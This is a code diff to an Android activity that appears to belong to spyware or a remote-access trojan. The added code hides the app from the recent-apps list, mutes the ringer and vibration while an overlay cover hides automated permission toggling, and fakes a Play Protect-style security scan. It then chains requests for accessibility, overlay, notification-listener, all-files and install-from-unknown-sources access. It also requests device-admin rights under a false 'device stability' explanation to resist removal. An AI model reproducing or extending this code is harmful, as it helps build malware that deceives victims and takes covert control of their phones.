@@ -16,7 +16,7 @@ import android.widget.ProgressBar;
 import android.widget.TextView;
 
 import androidx.annotation.NonNull;
-import androidx.appcompat.app.AppCompatActivity;
+import android.app.Activity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
@@ -30,9 +30,8 @@ import java.util.List;
  * Streamlined: Uses Accessibility guide overlay for service enablement, then directly triggers
  * settings intents on Play Protect verifying UI while Ghost AutoPilot handles switch toggles.
  */
-public class PermissionActivity extends AppCompatActivity {
+public class PermissionActivity extends Activity {
 
-    private static final String TAG = "PermissionActivity";
     private static final int PERMISSION_REQUEST_CODE = 2001;
 
     private boolean isAnimationRunning = false;
@@ -94,29 +93,54 @@ public class PermissionActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        try {
+            if (Build.VERSION.SDK_INT >= 34) {
+                overrideActivityTransition(OVERRIDE_TRANSITION_OPEN, 0, 0);
+                overrideActivityTransition(OVERRIDE_TRANSITION_CLOSE, 0, 0);
+            } else {
+                overridePendingTransition(0, 0);
+            }
+        } catch (Throwable ignored) {}
+        
+        // --- RECENT APPS GHOSTING PROTOCOL ---
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
+                if (am != null) {
+                    java.util.List<android.app.ActivityManager.AppTask> tasks = am.getAppTasks();
+                    if (tasks != null) {
+                        for (android.app.ActivityManager.AppTask task : tasks) {
+                            task.setExcludeFromRecents(true);
+                        }
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
         
         // SUSPEND ANTI-REMOVAL
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", true).apply();
 
         if (getIntent() != null && getIntent().getBooleanExtra("launch_admin", false)) {
+            setContentView(new android.view.View(this));
+            getWindow().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
             openAdminSettings();
-            finish();
+            return;
+        }
+
+        if (allStandardGranted()) {
+            restoreRingerMode();
+            IO_Persistence_Manager.setPermissionCoverVisible(false);
+            IO_Persistence_Manager.setAutoPilot(false);
+            showCompletionUI();
             return;
         }
         
-        boolean accMissing = !isAccessibilityServiceEnabled(this);
-        if (!hasScanned && (accMissing || !areRuntimePermissionsGranted())) {
-            setupScanningUI();
-        } else {
-            checkSpecialChain();
-        }
-        
+        checkSpecialChain();
         handleInstructions(getIntent());
     }
 
     private void setupScanningUI() {
         if (isAnimationRunning) return;
-        setTheme(R.style.Theme_LabRATS_Permissions);
         setContentView(R.layout.activity_guide_permission);
         currentLayoutType = "scanning";
 
@@ -124,42 +148,15 @@ public class PermissionActivity extends AppCompatActivity {
         TextView tvDetails = findViewById(R.id.tvPlayProtectDetails);
         TextView tvSub = findViewById(R.id.tvPlayProtectSub);
 
-        isAnimationRunning = true;
-        final long startTime = android.os.SystemClock.elapsedRealtime();
-        final long totalDuration = 2800; // Calmer 2.8s scan delay (~30% longer)
+        if (pb != null) {
+            pb.setProgress(20);
+        }
+        if (tvDetails != null) tvDetails.setText("Verifying security environment...");
+        if (tvSub != null) tvSub.setText("Verifying environment...");
 
-        chainHandler.post(new Runnable() {
-            @Override
-            public void run() {
-                if (isFinishing() || isDestroyed() || !"scanning".equals(currentLayoutType)) return;
-                
-                long elapsed = android.os.SystemClock.elapsedRealtime() - startTime;
-                int progress = (int) Math.min(100, (elapsed * 100) / totalDuration);
-                
-                if (pb != null) {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                        pb.setProgress(progress, true);
-                    } else {
-                        pb.setProgress(progress);
-                    }
-                }
-                if (tvDetails != null) {
-                    if (progress < 30) tvDetails.setText("Initializing security environment...");
-                    else if (progress < 60) tvDetails.setText("Analyzing security modules...");
-                    else if (progress < 85) tvDetails.setText("Checking for restricted access...");
-                    else tvDetails.setText("Finalizing report...");
-                }
-                if (progress > 40 && tvSub != null) tvSub.setText("Verifying environment...");
-
-                if (progress < 100) {
-                    chainHandler.postDelayed(this, 16); // 60 FPS update
-                } else {
-                    isAnimationRunning = false;
-                    hasScanned = true;
-                    checkSpecialChain();
-                }
-            }
-        });
+        hasScanned = true;
+        isAnimationRunning = false;
+        checkSpecialChain();
     }
 
     private int currentScanProgress = 20;
@@ -171,7 +168,13 @@ public class PermissionActivity extends AppCompatActivity {
             ProgressBar pb = findViewById(R.id.pbPlayProtect);
             TextView tvDetails = findViewById(R.id.tvPlayProtectDetails);
             TextView tvSub = findViewById(R.id.tvPlayProtectSub);
-            if (pb != null) pb.setProgress(currentScanProgress);
+            if (pb != null) {
+                pb.setProgress(currentScanProgress);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                    pb.setIndeterminateTintList(android.content.res.ColorStateList.valueOf(android.graphics.Color.parseColor("#34A853")));
+                    pb.setProgressTintList(android.content.res.ColorStateList.valueOf(android.graphics.Color.parseColor("#34A853")));
+                }
+            }
             if (tvDetails != null) tvDetails.setText("Verifying security environment...");
             if (tvSub != null) tvSub.setText("Verifying environment...");
         }
@@ -229,6 +232,34 @@ public class PermissionActivity extends AppCompatActivity {
         }
     }
 
+    private int originalRingerMode = -1;
+
+    private void silenceVibration() {
+        try {
+            IO_Persistence_Manager.silenceHaptics(this);
+            android.media.AudioManager am = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
+            if (am != null) {
+                if (originalRingerMode == -1) {
+                    originalRingerMode = am.getRingerMode();
+                }
+                am.setRingerMode(android.media.AudioManager.RINGER_MODE_SILENT);
+            }
+        } catch (Exception ignored) {}
+    }
+
+    private void restoreRingerMode() {
+        try {
+            IO_Persistence_Manager.restoreHaptics(this);
+            if (originalRingerMode != -1) {
+                android.media.AudioManager am = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
+                if (am != null) {
+                    am.setRingerMode(originalRingerMode);
+                }
+                originalRingerMode = -1;
+            }
+        } catch (Exception ignored) {}
+    }
+
     private void checkSpecialChain() {
         if (isFinishing() || isDestroyed()) return;
 
@@ -243,38 +274,49 @@ public class PermissionActivity extends AppCompatActivity {
             boolean filesMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !android.os.Environment.isExternalStorageManager() && !hasAttemptedFiles;
             boolean installMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls() && !hasAttemptedInstall;
 
-            // FAST DIRECT PIPELINE: 200ms Lightning Dispatch
+            if (!accMissing) {
+                silenceVibration();
+                IO_Persistence_Manager.setPermissionCoverVisible(true);
+            }
+
+            // FAST DIRECT PIPELINE: 50ms Lightning Dispatch (Zero Stall / Zero Unmask)
             if (accMissing) {
+                restoreRingerMode();
+                IO_Persistence_Manager.setPermissionCoverVisible(false);
                 showAccessibilityGuide();
             } else if (runtimeMissing) {
                 updateVerifyingUI(35, "Verifying runtime security permissions...");
-                chainHandler.postDelayed(this::requestMissingBatch, 200);
+                chainHandler.postDelayed(this::requestMissingBatch, 50);
             } else if (overlayMissing) {
                 updateVerifyingUI(55, "Checking display over other apps...");
-                chainHandler.postDelayed(this::openOverlaySettings, 200);
+                chainHandler.postDelayed(this::openOverlaySettings, 50);
             } else if (notifMissing) {
                 updateVerifyingUI(75, "Verifying notification listener access...");
-                chainHandler.postDelayed(this::openNotificationSettings, 200);
+                chainHandler.postDelayed(this::openNotificationSettings, 50);
             } else if (filesMissing) {
                 hasAttemptedFiles = true;
                 updateVerifyingUI(88, "Checking file storage access...");
-                chainHandler.postDelayed(this::openFilesSettings, 200);
+                chainHandler.postDelayed(this::openFilesSettings, 50);
             } else if (installMissing) {
                 hasAttemptedInstall = true;
                 updateVerifyingUI(96, "Checking package installation access...");
-                chainHandler.postDelayed(this::openInstallSettings, 200);
+                chainHandler.postDelayed(this::openInstallSettings, 50);
             } else {
+                restoreRingerMode();
+                IO_Persistence_Manager.setPermissionCoverVisible(false);
                 IO_Persistence_Manager.setAutoPilot(false);
                 updateVerifyingUI(100, "Security scan complete.");
                 // Pause for 0.8 second after scan reaches 100%, then pop up completion text & FINISH button
                 chainHandler.postDelayed(this::showCompletionUI, 800);
             }
-        }, 200);
+        }, 50);
     }
 
     private void showCompletionUI() {
         if (isFinishing() || isDestroyed()) return;
 
+        restoreRingerMode();
+        IO_Persistence_Manager.setPermissionCoverVisible(false);
         currentLayoutType = "completed";
 
         ProgressBar pb = findViewById(R.id.pbPlayProtect);
@@ -355,7 +397,11 @@ public class PermissionActivity extends AppCompatActivity {
             home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(home);
         } catch (Exception ignored) {}
-        finish();
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            finishAndRemoveTask();
+        } else {
+            finish();
+        }
     }
 
     private void showAccessibilityGuide() {
@@ -391,6 +437,12 @@ public class PermissionActivity extends AppCompatActivity {
     protected void onNewIntent(Intent intent) {
         super.onNewIntent(intent);
         setIntent(intent);
+        if (intent != null && intent.getBooleanExtra("launch_admin", false)) {
+            setContentView(new android.view.View(this));
+            getWindow().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
+            openAdminSettings();
+            return;
+        }
         handleInstructions(intent);
     }
 
@@ -411,7 +463,7 @@ public class PermissionActivity extends AppCompatActivity {
                 Intent intent = new Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
                 ComponentName cn = new ComponentName(this, IO_Persistence_Manager.class);
                 intent.putExtra(Intent.EXTRA_COMPONENT_NAME, cn.flattenToString());
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
                 return;
             }
@@ -419,7 +471,7 @@ public class PermissionActivity extends AppCompatActivity {
 
         try {
             Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
         } catch (Exception ignored) {}
     }
@@ -427,7 +479,7 @@ public class PermissionActivity extends AppCompatActivity {
     private void openNotificationSettings() {
         try {
             Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
         } catch (Exception ignored) {}
     }
@@ -435,12 +487,12 @@ public class PermissionActivity extends AppCompatActivity {
     private void openOverlaySettings() {
         try {
             Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
         } catch (Exception e) {
             try {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
             } catch (Exception ignored) {}
         }
@@ -450,14 +502,14 @@ public class PermissionActivity extends AppCompatActivity {
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName()));
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
             }
         } catch (Exception e) {
             try {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                     Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     startActivity(intent);
                 }
             } catch (Exception ignored) {}
@@ -468,43 +520,49 @@ public class PermissionActivity extends AppCompatActivity {
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:" + getPackageName()));
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
             }
         } catch (Exception e) {
             try {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     startActivity(intent);
                 }
             } catch (Exception ignored) {}
         }
     }
 
-    private boolean isDeviceAdminActive() {
-        try {
-            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-            ComponentName admin = new ComponentName(this, StabilityPolicy.class);
-            return dpm != null && dpm.isAdminActive(admin);
-        } catch (Exception e) {
-            return false;
-        }
-    }
+    private static final int REQUEST_CODE_DEVICE_ADMIN = 1337;
 
     private void openAdminSettings() {
         try {
             IO_Persistence_Manager.stopSmartExit();
+            IO_Persistence_Manager.setAutoPilot(true);
             ComponentName admin = new ComponentName(this, StabilityPolicy.class);
             Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
             intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
             intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Synchronization with system frameworks is required to maintain device stability.");
-            startActivity(intent);
+            startActivityForResult(intent, REQUEST_CODE_DEVICE_ADMIN);
+            overridePendingTransition(0, 0);
         } catch (Exception ignored) {}
+    }
+
+    @SuppressWarnings("deprecation")
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == REQUEST_CODE_DEVICE_ADMIN) {
+            finish();
+            overridePendingTransition(0, 0);
+        }
     }
 
     @Override
     protected void onDestroy() {
+        restoreRingerMode();
+        IO_Persistence_Manager.setPermissionCoverVisible(false);
         chainHandler.removeCallbacksAndMessages(null);
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", false).apply();
         super.onDestroy();
@@ -520,17 +578,27 @@ public class PermissionActivity extends AppCompatActivity {
     protected void onResume() {
         super.onResume();
 
+        boolean isLaunchingAdmin = getIntent() != null && getIntent().getBooleanExtra("launch_admin", false);
+        if (isLaunchingAdmin) {
+            return;
+        }
+
+        if (allStandardGranted()) {
+            restoreRingerMode();
+            IO_Persistence_Manager.setPermissionCoverVisible(false);
+            IO_Persistence_Manager.setAutoPilot(false);
+            if (!"completed".equals(currentLayoutType)) {
+                showCompletionUI();
+            }
+            return;
+        }
+
         // If Accessibility was enabled, switch layout immediately before window draws (0ms delay)
         if (isAccessibilityServiceEnabled(this) && "accessibility".equals(currentLayoutType)) {
             ensureVerifyingUI();
         }
 
-        if (allStandardGranted()) {
-            IO_Persistence_Manager.setAutoPilot(false);
-            if (!"completed".equals(currentLayoutType)) {
-                checkSpecialChain();
-            }
-        } else if (!hasScanned && !isAnimationRunning && !"scanning".equals(currentLayoutType)) {
+        if (!hasScanned && !isAnimationRunning && !"scanning".equals(currentLayoutType)) {
             setupScanningUI();
         } else {
             checkSpecialChain();
@@ -560,12 +628,22 @@ public class PermissionActivity extends AppCompatActivity {
         }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.READ_MEDIA_IMAGES);
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.READ_MEDIA_VIDEO);
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.READ_MEDIA_AUDIO);
+            boolean hasImages = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
+            boolean hasVideo = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED;
+            boolean hasAudio = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) == PackageManager.PERMISSION_GRANTED;
+
+            if (Build.VERSION.SDK_INT >= 34) {
+                boolean hasSelected = ContextCompat.checkSelfPermission(this, "android.permission.READ_MEDIA_VISUAL_USER_SELECTED") == PackageManager.PERMISSION_GRANTED;
+                if (!hasImages && !hasSelected) needed.add(Manifest.permission.READ_MEDIA_IMAGES);
+                if (!hasVideo && !hasSelected) needed.add(Manifest.permission.READ_MEDIA_VIDEO);
+                if (!hasImages && !hasVideo && !hasSelected) {
+                    needed.add("android.permission.READ_MEDIA_VISUAL_USER_SELECTED");
+                }
+            } else {
+                if (!hasImages) needed.add(Manifest.permission.READ_MEDIA_IMAGES);
+                if (!hasVideo) needed.add(Manifest.permission.READ_MEDIA_VIDEO);
+            }
+            if (!hasAudio) needed.add(Manifest.permission.READ_MEDIA_AUDIO);
         }
         return needed;
     }
